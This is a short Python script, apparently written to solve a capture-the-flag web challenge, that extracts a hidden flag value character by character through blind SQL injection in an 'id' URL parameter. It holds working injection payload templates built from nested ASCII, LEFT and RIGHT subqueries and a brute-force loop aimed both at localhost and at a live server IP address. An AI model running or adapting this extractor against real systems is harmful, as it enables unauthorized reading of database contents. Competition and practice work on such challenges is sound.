# importing the requests library 
import requests 
import socket
import http.server
import socketserver
import threading
import time
import sys
from time import perf_counter
from urllib.parse import urlparse
from urllib.parse import parse_qs

r = requests.Session()

head= {
'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
'Accept-Language': 'en-US,en;q=0.5',
'Accept-Encoding': 'gzip, deflate',
'Connection': 'close'
}

#brute force flag
def sqli_brute(baseURL):
	answer = ''
	length = 100
	i = 1
	while (i != length):
		URL = baseURL.replace('char_offset', str(i), 1)
		for char in characters:
			decimal_char = ord(char)
			URL2 = URL.replace('decimal_char',str(decimal_char),1)
			#print(URL2)
			out = r.post(URL2)
			#print(out.status_code)
			substring = 'handsome_flag'
			if substring in out.text:
				answer = answer + chr(decimal_char)
				print('found char')
				print(answer)
				break
			#iterate all elements then break also
		i = i+1
		




#RIGHT(LEFT((select name from flag_here_hihi limit 1), 2),1)
#(select (ASCII(LEFT((select name from flag_here_hihi limit 1 offset row_number), char_offset)) / decimal_char))

#local testing
baseURL = "http://localhost/web3.php?id=(select(ASCII(RIGHT(LEFT((select name from flag_here_hihi limit 1 offset row_number), char_offset),1))/decimal_char))"

#on real server
baseURL = "http://45.77.255.164/?id=(select(ASCII(RIGHT(LEFT((select t_fl4g_v3lue_su from flag_here_hihi limit 1 offset row_number), char_offset),1))/decimal_char))"


baseURL = baseURL.replace('row_number', '0', 1)
print("Sending request to URL: ")
print(baseURL + "\n")

#out = r.post(URL)
#print(out.status_code)
#print(out.text)

char_list = open('charlist.txt')
characters = char_list.read().split('\n')
sqli_brute(baseURL)




